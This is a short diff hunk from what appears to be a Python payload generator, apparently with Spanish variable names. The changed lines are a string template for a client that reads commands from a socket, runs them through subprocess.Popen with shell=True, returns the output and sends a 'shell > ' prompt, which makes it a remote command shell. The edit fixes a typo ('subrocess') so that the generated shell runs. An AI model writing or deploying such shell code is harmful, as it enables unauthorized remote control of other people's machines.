@@ -44,7 +44,7 @@ if numero == 1:
              "   while True:\n"\
              "       comandoBytes=cliente.recv(1024)\n"\
              "       comandoCodificado=comandoBytes.decode(\"ascii\")\n"\
-             "       comando=subrocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n"\
+             "       comando=subprocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n"\
              "       cliente.send(comando.stdout.read())\n"\
              "       cliente.send(\"shell > \".encode(\"ascii\"))\n"\
              "except:\n"\
